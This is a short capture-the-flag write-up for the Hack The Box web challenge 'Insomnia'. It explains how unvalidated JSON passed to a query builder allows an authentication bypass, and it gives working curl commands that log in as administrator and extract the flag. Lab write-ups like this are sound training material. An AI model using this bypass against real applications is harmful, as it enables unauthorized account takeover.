# Target
| Category      | Details                                                    |
|---------------|------------------------------------------------------------|
| 📝 Name       | [Insomnia](https://app.hackthebox.com/challenges/Insomnia) |
| 🏷 Type       | HTB Web Challenge                                          |
| 🎯 Difficulty | Easy                                                       |

# Solution
In `UserController.php` we could spot vulnerability in the following code:
```
$json_data = request()->getJSON(true);
if (!count($json_data) == 2) {
    return $this->respond("Please provide username and password", 404);
}
$query = $db->table("users")->getWhere($json_data, 1, 0);
```

* `$json_data = request()->getJSON(true)` converts any JSON input into an associative array.
* `getWhere($json_data, 1, 0)` uses `$json_data` as query conditions, as there is no validation (other than fields count equal to 2), we can inject any field into the `WHERE`` clause.

Quick look into `entrypoint.sh` shows us structure of `users` table.
```
sqlite3 /var/www/html/Insomnia/database/insomnia.db <<'EOF'
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT NOT NULL,
    password TEXT NOT NULL
);
INSERT INTO users (username, password) VALUES ('administrator', LOWER(hex(randomblob(16))));
EOF
```

Knowing all that we could bypass authentication, obtain JWT for `administrator` user and use it to exfiltrate flag.
```
┌──(magicrc㉿perun)-[~/attack/HTB Insomnia]
└─$ TOKEN=$(curl -s http://$TARGET/index.php/login -H 'Content-Type: application/json' -d '{"username":"administrator","id":"1"}' | jq -r .token)
curl -s http://$TARGET/index.php/profile -H "Cookie: token=$TOKEN" | grep -oP 'HTB\{.*?\}'
HTB{FAKE_FLAG_FOR_TESTING}
```